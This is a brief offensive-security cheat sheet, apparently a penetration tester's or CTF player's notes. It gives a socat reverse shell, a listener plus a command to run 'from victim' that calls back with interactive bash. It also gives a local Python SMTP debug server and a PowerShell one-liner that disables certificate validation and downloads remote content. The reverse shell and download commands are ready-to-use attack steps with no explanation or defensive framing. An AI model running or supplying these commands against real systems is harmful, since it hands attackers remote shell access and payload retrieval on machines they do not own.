<h3>Spawn tty</h3>

listener on your machine:
socat file:\`tty\`,raw,echo=0 tcp-listen:4444 

connect from victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.18:4444 

<h3>SMTP Server</h3>
sudo python -m smtpd -n -c DebuggingServer localhost:25

<h3>Powershell v2 HTTPS GET Request </h3>

"cmd.exe /c powershell.exe  -ExecutionPolicy unrestricted -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object Net.WebClient).DownloadString(\"https://site\")" > \\\share"
